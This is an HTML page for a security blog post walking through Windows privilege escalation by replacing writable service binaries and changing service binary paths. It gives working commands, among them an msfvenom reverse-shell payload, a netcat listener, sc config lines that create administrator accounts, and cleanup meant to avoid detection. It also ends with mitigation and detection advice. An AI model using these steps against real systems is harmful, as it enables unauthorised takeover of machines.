@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- SEO Meta Tags -->
+    <title>Windows Privilege Escalation via Weak Service Permissions | Foruth</title>
+    <meta name="description"
+        content="Learn how to exploit weak service permissions and permissive file system ACLs to escalate privileges on Windows systems. A comprehensive walkthrough for penetration testers.">
+    <meta name="author" content="Pravin Mohite">
+    <link rel="canonical"
+        href="https://foruth.github.io/posts/Windows%20Privilege%20Escalation%20Weak%20Service%20Permissions.html">
+
+    <!-- Open Graph / Social -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Windows Privilege Escalation via Weak Service Permissions">
+    <meta property="og:description"
+        content="Learn how to exploit weak service permissions and permissive file system ACLs to escalate privileges on Windows systems.">
+    <meta property="og:url"
+        content="https://foruth.github.io/posts/Windows%20Privilege%20Escalation%20Weak%20Service%20Permissions.html">
+    <meta property="og:image" content="https://foruth.github.io/img/og-priv-esc.png">
+    <meta property="article:published_time" content="2025-12-09T09:00:00Z">
+    <meta property="article:author" content="Pravin Mohite">
+    <meta property="article:tag" content="Windows Security">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Service Permissions">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Windows Privilege Escalation via Weak Service Permissions">
+    <meta name="twitter:description"
+        content="Learn how to exploit weak service permissions and permissive file system ACLs to escalate privileges on Windows systems.">
+    <meta name="twitter:image" content="https://foruth.github.io/img/og-priv-esc.png">
+
+    <!-- Structured Data (Article Schema) -->
+    <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "Windows Privilege Escalation via Weak Service Permissions",
+    "description": "Learn how to exploit weak service permissions and permissive file system ACLs to escalate privileges on Windows systems.",
+    "image": "https://foruth.github.io/img/og-priv-esc.png",
+    "author": {
+      "@type": "Person",
+      "name": "Pravin Mohite"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Foruth Security Blog",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://foruth.github.io/img/logo.png"
+      }
+    },
+    "datePublished": "2025-12-09",
+    "dateModified": "2025-12-09"
+  }
+  </script>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Merriweather:wght@400;700&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: ['class', '[data-theme="dark"]'],
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+                        serif: ['Merriweather', 'Georgia', 'serif'],
+                        mono: ['Fira Code', 'Monaco', 'Consolas', 'monospace'],
+                    },
+                }
+            }
+        }
+    </script>
+
+    <!-- Custom Styles -->
+    <link rel="stylesheet" href="../css/custom.css">
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+
+    <!-- RSS Feed -->
+    <link rel="alternate" type="application/rss+xml" title="Security Research RSS Feed" href="../rss.xml">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="../img/favicon.ico">
+</head>
+
+<body class="bg-white dark:bg-slate-900 text-slate-800 dark:text-slate-100 min-h-screen transition-colors duration-200">
+
+    <!-- Skip Link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- HEADER / NAVIGATION -->
+    <header
+        class="sticky top-0 z-50 bg-white/80 dark:bg-slate-900/80 backdrop-blur-md border-b border-slate-200 dark:border-slate-700">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+
+                <!-- Logo -->
+                <a href="../index.html"
+                    class="flex items-center gap-2 text-xl font-bold text-slate-900 dark:text-white hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">
+                    <img src="../img/logo.png" alt="Foruth Logo" class="w-8 h-8">
+                    <span>Foruth</span>
+                </a>
+
+                <!-- Navigation -->
+                <nav class="hidden md:flex items-center gap-8 text-sm">
+                    <a href="../index.html"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">Home</a>
+                    <a href="#"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">About</a>
+                    <a href="#"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">Archive</a>
+                    <a href="../rss.xml"
+                        class="text-slate-600 dark:text-slate-300 hover:text-indigo-600 dark:hover:text-indigo-400 font-medium transition-colors">RSS</a>
+                </nav>
+
+                <!-- Search & Theme Toggle -->
+                <div class="flex items-center gap-2">
+                    <button id="search-toggle" class="theme-toggle" aria-label="Search" title="Search (Ctrl+K)">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                    </button>
+                    <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode"
+                        title="Toggle dark mode">
+                        <svg class="icon-sun w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z">
+                            </path>
+                        </svg>
+                        <svg class="icon-moon w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main id="main-content" class="max-w-5xl mx-auto px-4 sm:px-6 py-10">
+
+        <!-- Hero -->
+        <section class="mb-10">
+            <div class="mb-6 rounded-2xl overflow-hidden shadow-sm border border-slate-200 dark:border-slate-800">
+                <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&h=400&fit=crop"
+                    alt="Windows security and privilege escalation concept" width="1200" height="400" loading="eager"
+                    class="w-full h-auto object-cover">
+            </div>
+
+            <div class="flex flex-wrap gap-2 mb-4">
+                <span class="tag-chip">Windows Security</span>
+                <span class="tag-chip">Privilege Escalation</span>
+                <span class="tag-chip">Service Permissions</span>
+            </div>
+
+            <h1 class="font-serif text-3xl sm:text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4">
+                Windows Privilege Escalation via Weak Service Permissions
+            </h1>
+
+            <section class="not-prose mt-4">
+                <div class="author-box">
+                    <img src="../img/avatar.png" alt="Pravin Mohite" class="author-box__avatar" width="64" height="64">
+                    <div>
+                        <p class="author-box__name">Pravin Mohite</p>
+                        <div
+                            class="mt-2 flex flex-wrap items-center gap-3 text-xs sm:text-sm text-slate-500 dark:text-slate-400">
+                            <time datetime="2025-12-09">December 9, 2025</time>
+                            <span>•</span>
+                            <span>15 min read</span>
+                            <span>•</span>
+                            <span class="inline-flex items-center gap-1">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                                </svg>
+                                <span class="js-visitor-count">--</span>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+        </section>
+
+        <!-- Article Body -->
+        <article class="prose prose-slate dark:prose-invert max-w-none">
+
+            <h2 id="overview">Overview</h2>
+            <p>
+                This walkthrough demonstrates two common privilege escalation techniques on Windows systems by
+                exploiting weak permissions: <strong>Permissive File System ACLs</strong> and <strong>Weak Service
+                    Permissions</strong>. These vulnerabilities often occur in third-party applications, custom
+                software, or improperly configured services, allowing standard users to escalate to SYSTEM or
+                Administrator privileges.
+            </p>
+
+            <div class="not-prose my-6 p-4 bg-amber-50 dark:bg-amber-900/20 border-l-4 border-amber-500 rounded-r-lg">
+                <p class="text-amber-800 dark:text-amber-200 text-sm">
+                    <strong>⚠️ Educational Purpose Only:</strong>
+                    This walkthrough is for educational purposes in authorized penetration testing environments only.
+                    Always obtain proper authorization before testing security vulnerabilities.
+                </p>
+            </div>
+
+            <h2 id="prerequisites">Prerequisites</h2>
+            <ul>
+                <li>Initial access to a Windows system with standard user privileges</li>
+                <li>Ability to execute commands (via shell, RDP, or other means)</li>
+                <li>Basic familiarity with Windows command line and PowerShell</li>
+            </ul>
+
+            <h2 id="part1">Part 1: Exploiting Permissive File System ACLs</h2>
+
+            <h3 id="understanding-acl-vuln">Understanding the Vulnerability</h3>
+            <p>
+                When service binaries have weak Access Control Lists (ACLs), standard users can modify or replace them.
+                Since services often run with SYSTEM privileges, replacing a legitimate service binary with a malicious
+                one results in code execution as SYSTEM when the service starts.
+            </p>
+
+            <h3 id="step1-enum">Step 1: Initial Enumeration with SharpUp</h3>
+            <p>First, use SharpUp to identify potential vulnerabilities:</p>
+
+            <pre><code class="language-powershell">PS C:\foruth> .\SharpUp.exe audit
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+=== Modifiable Service Binaries ===
+
+  Name             : SecurityService
+  DisplayName      : PC Security Management Service
+  Description      : Responsible for managing PC security
+  State            : Stopped
+  StartMode        : Auto
+  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
+
+            <p><strong>Key Finding:</strong> The <code>SecurityService.exe</code> binary is potentially modifiable.</p>
+
+            <h3 id="step2-verify">Step 2: Verify Permissions with icacls</h3>
+            <p>Confirm the weak permissions using Windows' built-in <code>icacls</code> tool:</p>
+
+            <pre><code class="language-powershell">PS C:\foruth> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+
+C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
+                                                     Everyone:(I)(F)
+                                                     NT AUTHORITY\SYSTEM:(I)(F)
+                                                     BUILTIN\Administrators:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files</code></pre>
+
+            <p><strong>Critical Finding:</strong> Both <code>BUILTIN\Users</code> and <code>Everyone</code> have
+                <code>(F)</code> - Full Control permissions on the binary.
+            </p>
+
+            <h3 id="step3-payload">Step 3: Create Malicious Replacement Binary</h3>
+            <p>On your attacker machine, generate a malicious binary with msfvenom:</p>
+
+            <pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;YOUR_IP&gt; LPORT=4444 -f exe -o malicious.exe</code></pre>
+
+            <p>Transfer the malicious binary to the target (using your preferred method - SMB, HTTP, etc.).</p>
+
+            <h3 id="step4-replace">Step 4: Replace the Service Binary</h3>
+            <p>Back up the original binary and replace it with your malicious one:</p>
+
+            <pre><code class="language-cmd">C:\foruth> copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" "C:\temp\SecurityService.exe.bak"
+C:\foruth> copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
+
+            <h3 id="step5-shell">Step 5: Start the Service and Receive Shell</h3>
+            <p>Start a listener on your attacker machine:</p>
+
+            <pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+            <p>Then start the service on the target:</p>
+
+            <pre><code class="language-cmd">C:\foruth> sc start SecurityService</code></pre>
+
+            <p><strong>Result:</strong> You receive a reverse shell running as SYSTEM.</p>
+
+            <h2 id="part2">Part 2: Exploiting Weak Service Permissions</h2>
+
+            <h3 id="understanding-svc-vuln">Understanding the Vulnerability</h3>
+            <p>
+                When services have weak permissions, standard users can modify service configurations - including the
+                binary path. By changing the binary path to execute arbitrary commands and restarting the service, those
+                commands run with the service's privileges (often SYSTEM).
+            </p>
+
+            <h3 id="step1-enum2">Step 1: Enumeration with SharpUp</h3>
+            <p>Run SharpUp to identify services with weak permissions:</p>
+
+            <pre><code class="language-cmd">C:\foruth> SharpUp.exe audit
+ 
+=== SharpUp: Running Privilege Escalation Checks ===
+ 
+=== Modifiable Services ===
+ 
+  Name             : WindscribeService
+  DisplayName      : WindscribeService
+  Description      : Manages the firewall and controls the VPN tunnel
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"</code></pre>
+
+            <h3 id="step2-accesschk">Step 2: Detailed Permission Analysis with AccessChk</h3>
+            <p>Use Sysinternals AccessChk for detailed service permission analysis:</p>
+
+            <pre><code class="language-cmd">C:\foruth> accesschk.exe /accepteula -quvcw WindscribeService
+ 
+Accesschk v6.13 - Reports effective permissions for securable objects
+Copyright (C) 2006-2020 Mark Russinovich
+Sysinternals - www.sysinternals.com
+ 
+WindscribeService
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS</code></pre>
+
+            <p><strong>Critical Finding:</strong> <code>NT AUTHORITY\Authenticated Users</code> has
+                <code>SERVICE_ALL_ACCESS</code>, meaning any authenticated user can fully control this service.
+            </p>
+
+            <h3 id="step3-verify2">Step 3: Verify Current Privileges</h3>
+            <p>Check if you're already an administrator:</p>
+
+            <pre><code class="language-cmd">C:\foruth> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access
+ 
+Members
+-------------------------------------------------------------------------------
+Administrator
+bob
+The command completed successfully.</code></pre>
+
+            <p><strong>Note:</strong> Your current user (<code>foruth</code> in this example) is NOT in the
+                administrators group.</p>
+
+            <h3 id="step4-modify">Step 4: Modify Service Binary Path</h3>
+            <p>Change the service's binary path to add your user to the administrators group:</p>
+
+            <pre><code class="language-cmd">C:\foruth> sc config WindscribeService binpath="cmd /c net localgroup administrators foruth /add"
+
+[SC] ChangeServiceConfig SUCCESS</code></pre>
+
+            <p><strong>Alternative Payloads:</strong></p>
+            <ul>
+                <li>For reverse shell: <code>binpath="cmd /c c:\temp\malicious.exe"</code></li>
+                <li>For creating new admin user:
+                    <code>binpath="cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"</code>
+                </li>
+            </ul>
+
+            <h3 id="step5-trigger">Step 5: Trigger the Payload</h3>
+            <p>Stop and start the service to execute the command:</p>
+
+            <pre><code class="language-cmd">C:\foruth> sc stop WindscribeService
+ 
+SERVICE_NAME: WindscribeService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+
+C:\foruth> sc start WindscribeService
+
+[SC] StartService FAILED 1053:
+The service did not respond to the start or control request in a timely fashion.</code></pre>
+
+            <p><strong>Note:</strong> The service fails to start (expected since we changed the binary path), but the
+                command still executes before the failure.</p>
+
+            <h3 id="step6-verify">Step 6: Verify Privilege Escalation</h3>
+            <p>Check if your user was successfully added to the administrators group:</p>
+
+            <pre><code class="language-cmd">C:\foruth> net localgroup administrators
+
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access
+ 
+Members
+-------------------------------------------------------------------------------
+Administrator
+foruth
+bob
+The command completed successfully.</code></pre>
+
+            <p><strong>Success!</strong> Your user (<code>foruth</code>) is now a member of the administrators
+                group.</p>
+
+            <h2 id="cleanup">Part 3: Cleanup and Restoration</h2>
+
+            <h3>Restore the Service (Optional but Recommended)</h3>
+            <p>To avoid detection and maintain system stability, restore the service to its original configuration:</p>
+
+            <pre><code class="language-cmd">C:\foruth> sc stop WindscribeService
+C:\foruth> sc config WindscribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"
+[SC] ChangeServiceConfig SUCCESS
+C:\foruth> sc start WindscribeService
+C:\foruth> sc query WindscribeService
+ 
+SERVICE_NAME: WindscribeService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  Running
+        WIN32_EXIT_CODE    : 0  (0x0)</code></pre>
+
+            <h2 id="tools">Key Tools and Commands Reference</h2>
+
+            <h3>Enumeration Tools</h3>
+            <ol>
+                <li><strong>SharpUp:</strong> <code>SharpUp.exe audit</code> - Checks for various privilege escalation
+                    vectors</li>
+                <li><strong>AccessChk:</strong> <code>accesschk.exe /accepteula -quvcw &lt;service_name&gt;</code> -
+                    Detailed service permission analysis</li>
+                <li><strong>icacls:</strong> <code>icacls "&lt;file_path&gt;"</code> - View file/folder permissions</li>
+                <li><strong>sc:</strong> <code>sc query &lt;service_name&gt;</code> - Service control manager commands
+                </li>
+            </ol>
+
+            <h3>Critical Commands</h3>
+            <ul>
+                <li><code>sc config &lt;service&gt; binpath="&lt;command&gt;"</code> - Change service binary path</li>
+                <li><code>sc stop/start &lt;service&gt;</code> - Control service state</li>
+                <li><code>net localgroup administrators</code> - View/Modify local administrators group</li>
+            </ul>
+
+            <h2 id="defense">Defense and Mitigation</h2>
+
+            <h3>For System Administrators:</h3>
+            <ol>
+                <li><strong>Follow Principle of Least Privilege:</strong> Services should run with minimum necessary
+                    privileges</li>
+                <li><strong>Regular Permission Audits:</strong> Periodically review service and file permissions</li>
+                <li><strong>Secure Service Binaries:</strong> Ensure service binaries have restrictive ACLs (SYSTEM and
+                    Administrators only)</li>
+                <li><strong>Use Service Hardening:</strong> Implement service isolation and reduce privileges</li>
+                <li><strong>Monitor Service Changes:</strong> Alert on unexpected service configuration modifications
+                </li>
+            </ol>
+
+            <h3>Detection Indicators:</h3>
+            <ul>
+                <li>Unusual service binary modifications</li>
+                <li>Service configuration changes (especially binary path)</li>
+                <li>Failed service starts followed by successful authentication events</li>
+                <li>New users added to privileged groups</li>
+            </ul>
+
+            <p>
+                Weak permissions on services and their binaries represent significant security risks. Regular users can
+                exploit these misconfigurations to gain complete system control. Always audit service permissions, apply
+                the principle of least privilege, and monitor for unauthorized changes to prevent such escalations.
+            </p>
+
+            <!-- Learn More Callout -->
+            <div
+                class="not-prose my-8 p-5 bg-indigo-50 dark:bg-indigo-900/20 border border-indigo-200 dark:border-indigo-800 rounded-xl">
+                <h3 class="text-lg font-semibold text-indigo-900 dark:text-indigo-200 mb-2">📚 Want to Learn More?</h3>
+                <p class="text-indigo-800 dark:text-indigo-300 text-sm">
+                    For comprehensive training on Windows privilege escalation techniques, check out the
+                    <a href="https://academy.hackthebox.com/module/67" target="_blank" rel="noopener noreferrer"
+                        class="font-semibold underline hover:text-indigo-600 dark:hover:text-indigo-400">
+                        Hack The Box Academy - Windows Privilege Escalation Module
+                    </a>.
+                </p>
+            </div>
+
+            <h2 id="sources">Sources</h2>
+            <ul>
+                <li><a href="https://academy.hackthebox.com/module/67" target="_blank" rel="noopener noreferrer">Hack
+                        The Box Academy - Windows Privilege Escalation</a></li>
+            </ul>
+
+            <!-- Author Box -->
+            <section class="not-prose mt-10 pt-6 border-t border-slate-200 dark:border-slate-800">
+                <div class="author-box">
+                    <img src="../img/avatar.png" alt="Pravin Mohite" class="author-box__avatar" width="64" height="64">
+                    <div>
+                        <p class="author-box__name">Pravin Mohite</p>
+                        <p class="author-box__bio">
+                            Penetration Tester & Cybersecurity Engineer. Preparing for CPTS & OSCP.
+                            Specializing in vulnerability research, CTF-style lab creation, and offensive security.
+                        </p>
+                    </div>
+                </div>
+            </section>
+
+        </article>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="mt-16 border-t border-slate-200 dark:border-slate-800 bg-white/80 dark:bg-slate-900/80">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6 py-10 space-y-8">
+
+            <!-- Links & Social -->
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-6 text-sm">
+                <nav class="flex flex-wrap items-center justify-center gap-4 text-slate-600 dark:text-slate-400">
+                    <a href="../index.html"
+                        class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Home</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">About</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Archive</a>
+                    <span class="hidden sm:inline text-slate-300 dark:text-slate-600">|</span>
+                    <a href="../rss.xml" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">RSS
+                        Feed</a>
+                </nav>
+
+                <div class="flex items-center justify-center gap-4 text-slate-500">
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="GitHub">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="Twitter">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+                        </svg>
+                    </a>
+                    <a href="https://www.linkedin.com/in/encoded1/"
+                        class="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors"
+                        aria-label="LinkedIn">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+                            <path
+                                d="M20.5 2h-17A1.5 1.5 0 002 3.5v17A1.5 1.5 0 003.5 22h17a1.5 1.5 0 001.5-1.5v-17A1.5 1.5 0 0020.5 2zM8 19H5v-9h3zM6.5 8.25A1.75 1.75 0 118.3 6.5a1.78 1.78 0 01-1.8 1.75zM19 19h-3v-4.74c0-1.42-.6-1.93-1.38-1.93A1.74 1.74 0 0013 14.19a.66.66 0 000 .14V19h-3v-9h2.9v1.3a3.11 3.11 0 012.7-1.4c1.55 0 3.36.86 3.36 3.66z" />
+                        </svg>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Copyright -->
+            <div class="border-t border-slate-200 dark:border-slate-800 pt-4 text-center text-xs text-slate-500">
+                <p>2025 Pravin Mohite. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Search Modal -->
+    <div id="search-modal" class="search-modal hidden" role="dialog" aria-modal="true" aria-labelledby="search-title">
+        <div class="search-modal__backdrop"></div>
+        <div class="search-modal__container">
+            <div class="search-modal__content">
+                <div class="search-modal__header">
+                    <div class="search-modal__input-wrapper">
+                        <svg class="search-modal__icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                        <input type="text" id="search-input" class="search-modal__input" placeholder="Search posts..."
+                            autocomplete="off" autofocus>
+                        <kbd class="search-modal__kbd">ESC</kbd>
+                    </div>
+                </div>
+                <div id="search-results" class="search-modal__results">
+                    <p class="search-modal__hint">Type to search posts by title, content, or tags...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="../js/main.js"></script>
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script
+        src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+
+</html>
